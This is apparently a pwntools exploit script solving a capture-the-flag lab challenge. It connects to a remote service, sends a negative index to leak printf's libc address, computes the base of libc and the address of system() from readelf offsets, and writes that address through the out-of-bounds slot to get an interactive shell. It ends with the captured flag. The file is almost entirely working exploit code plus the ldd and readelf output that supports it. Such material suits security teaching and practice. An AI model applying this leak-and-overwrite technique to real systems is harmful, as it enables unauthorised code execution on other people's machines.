# %%

from pwn import *

# ref
# https://unix.stackexchange.com/questions/120015/how-to-find-out-the-dynamic-libraries-executables-loads-when-run
# https://askubuntu.com/questions/189835/strings-lib-libc-so-6-no-such-file

# %%

context.arch = "amd64"

conn = remote('10.113.184.121', 10043)
# conn = process(['./src/release/share/lab'])

# ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=47f2aaec3718df0ce2574f3520c3d1a5be9a5d04, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# gdbscript = 'gef\ngef\n'
# gdbscript += 'set follow-fork-mode child\n'

# _pid = gdb.attach(
#     conn,
#     gdbscript=gdbscript,
# )

# %%

conn.recvuntil(b'idx: ')
conn.sendline(b'-5')

# 0x4048 - 0x4020 = 40

a = conn.recvuntil(b' = ')
print(a)

printf_addr = int(conn.recvline().strip().decode())
libc_base_addr = printf_addr - 0x606f0
system_addr = libc_base_addr + 0x50d70

print("printf addr:    ", hex(printf_addr))
print("libc base addr: ", hex(libc_base_addr))
print("system addr:    ", hex(system_addr))
print()

conn.recvuntil(b'val: ')
conn.sendline(str(system_addr).encode())

conn.interactive()

# %%

# $ ldd ./src/release/share/lab
# linux-vdso.so.1 (0x00007ffe367cc000)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4c96200000)
# /lib64/ld-linux-x86-64.so.2 (0x00007f4c964b4000)

# %%

# $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf
#     58: 0000000000082ba0   179 FUNC    GLOBAL DEFAULT   15 swprintf@@GLIBC_2.2.5
#    267: 0000000000082c60    27 FUNC    GLOBAL DEFAULT   15 vwprintf@@GLIBC_2.2.5
#    590: 0000000000060a10   183 FUNC    GLOBAL DEFAULT   15 dprintf@@GLIBC_2.2.5
#    778: 0000000000060630   183 FUNC    GLOBAL DEFAULT   15 fprintf@@GLIBC_2.2.5
#   1211: 0000000000060950   183 FUNC    WEAK   DEFAULT   15 asprintf@@GLIBC_2.2.5
#   1430: 0000000000088340    11 FUNC    WEAK   DEFAULT   15 vdprintf@@GLIBC_2.2.5
#   1597: 000000000005a4a0    11 FUNC    GLOBAL DEFAULT   15 vfprintf@@GLIBC_2.2.5
#   1954: 0000000000060880   197 FUNC    GLOBAL DEFAULT   15 sprintf@@GLIBC_2.2.5
#   1973: 0000000000082ae0   183 FUNC    WEAK   DEFAULT   15 fwprintf@@GLIBC_2.2.5
#   2178: 00000000000607c0   179 FUNC    WEAK   DEFAULT   15 snprintf@@GLIBC_2.2.5
#   2286: 000000000005a4b0    27 FUNC    GLOBAL DEFAULT   15 vprintf@@GLIBC_2.2.5
#   2379: 0000000000082c80   204 FUNC    GLOBAL DEFAULT   15 wprintf@@GLIBC_2.2.5
#   2917: 00000000000819c0   183 FUNC    WEAK   DEFAULT   15 vsprintf@@GLIBC_2.2.5
#   2922: 00000000000606f0   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5

# $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
#   1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5

# %%

# flag{Libccccccccccccccccccccccccccc}
